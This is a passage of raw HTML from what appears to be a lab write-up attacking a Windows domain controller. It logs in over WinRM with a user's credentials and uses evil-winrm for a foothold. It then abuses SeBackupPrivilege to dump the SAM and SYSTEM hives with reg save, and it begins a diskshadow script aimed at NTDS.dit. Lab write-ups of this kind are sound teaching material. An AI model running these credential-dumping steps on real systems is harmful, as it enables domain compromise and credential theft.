294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>Now we can check if this user has got any remote connection privilege, we will check \u003Ccode>winrm\u003C/code> which is active on \u003Ccode>TCP 5985\u003C/code> \u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"plaintext\" class=\"wrap\" style=\"--ecMaxLine:106ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">metexec winrm babydc.baby.vl -u 'Caroline.Robinson' -p 'BabyStarted123!'\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8;--1:#e1e4e8\">WINRM       10.129.50.21    5985   BABYDC           [+] baby.vl\\Caroline.Robinson:BabyStarted123! (Pwn3d!)\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>Success! now we can foothold onto the machine\u003C/p>\u003C/section>\u003Csection>\u003Ch2 id=\"foothold\">Foothold\u003Ca class=\"anchor\" href=\"#foothold\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>Let’s use the \u003Ccode>evil-winrm\u003C/code> tool in order to get our foothold on the \u003Cem>DC\u003C/em>  \u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:66ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">evil-winrm\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-i\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> $TARGET \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-u\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'Caroline.Robinson'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-p\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'BabyStarted123!'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>Before using \u003Ccode>BloodHound\u003C/code> to escalate our privileges, let’s try to do some basic enumeration to see our current user’s privileges\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"powershell\" class=\"wrap\" style=\"--ecMaxLine:68ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">whoami \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">priv\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">PRIVILEGES INFORMATION\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">4\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583;--1:#F97583\">----------------------\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">5\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">6\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Privilege Name                Description                    State\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">7\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583;--1:#F97583\">=============================\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">==============================\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">=======\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">8\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">SeMachineAccountPrivilege     Add workstations to domain     Enabled\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">9\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">SeBackupPrivilege             Back up files and directories  Enabled\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">10\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">SeRestorePrivilege            Restore files and directories  Enabled\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">11\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">SeShutdownPrivilege           Shut down the system           Enabled\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">12\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">13\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">SeIncreaseWorkingSetPrivilege Increase a \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">process\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> working set Enabled\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>And we got a dangerous privilege!: \u003Ccode>SeBackupPrivilege\u003C/code> we can perform a copy of the \u003Ccode>SAM\u003C/code>, \u003Ccode>SYSTEM\u003C/code> &#x26; \u003Ccode>NTDS\u003C/code> which are sensitive databases that contain juicy hashes\u003C/p>\u003C/section>\u003Csection>\u003Ch2 id=\"abusing-sebackupprivilege\">Abusing SeBackupPrivilege\u003Ca class=\"anchor\" href=\"#abusing-sebackupprivilege\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>First, let’s copy the \u003Ccode>SAM\u003C/code> &#x26; \u003Ccode>SYSTEM\u003C/code> onto our \u003Ccode>C:\\Temp\u003C/code> folder using \u003Ccode>reg\u003C/code>. These registry hives contain:\u003C/p>\u003Cul>\n\u003Cli>\u003Ccode>SAM hive\u003C/code>: Local Security Account Manager database with local user hashes\u003C/li>\n\u003Cli>\u003Ccode>SYSTEM hive\u003C/code>: System boot key needed to decrypt the SAM database\u003C/li>\n\u003C/ul>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"powershell\" class=\"wrap\" style=\"--ecMaxLine:65ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583;--1:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Evil\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">WinRM\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> PS C:\\Temp\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> reg save HKLM\\SAM C:\\Temp\\sam.hive\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">The operation completed successfully.\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583;--1:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Evil\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">WinRM\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> PS C:\\Temp\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> reg save HKLM\\SYSTEM C:\\Temp\\system.hive\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">4\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">The operation completed successfully.\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">5\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583;--1:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Evil\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">WinRM\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> PS C:\\Temp\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> dir\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\" style=\"--ecIndent:4ch\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">6\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Directory: C:\\Temp\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">7\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">Mode                 LastWriteTime         Length Name\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">8\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583;--1:#F97583\">----\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">                 \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">-------------\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">------\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">----\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">9\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">a\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">----\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">24\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">2025\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">   \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">9\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">:\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">01\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> AM          \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">49152\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> sam.hive\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">10\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583;--1:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">a\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">----\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">24\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">/\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">2025\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">   \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">9\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">:\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">01\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> AM       \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">20684800\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> system.hive\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>Now for the \u003Ccode>NTDS.dit\u003C/code> - this is the Active Directory database file that contains all domain user hashes, but it’s constantly locked by the \u003Ccode>LSASS\u003C/code> process. We need to use \u003Cem>Volume Shadow Copy\u003C/em> Service \u003Ccode>(VSS)\u003C/code> to create a snapshot while the file is in use.\u003C/p>\u003Cp>First let’s create a script on our attacker machine which we can further \u003Cem>interpretate\u003C/em> with \u003Ccode>diskshadow\u003C/code> to make the backup of the \u003Ccode>NTDS\u003C/code> \u003C/p>\u003Cp>Save this into a \u003Ccode>script.txt\u003C/code> file\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"csharp\" class=\"wrap\" style=\"--ecMaxLine:38ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">set metadata \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">C\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">:\\Windows\\Temp\\meta.cabX\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">set context clientaccessibleX\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">set context persistentX\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">4\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">begin backupX\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">5\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">add volume \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">C\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">: alias cdriveX\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">6\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">createX\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">7\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">expose \u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">cdrive\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">E\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">:X\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">8\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">end backupX\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" 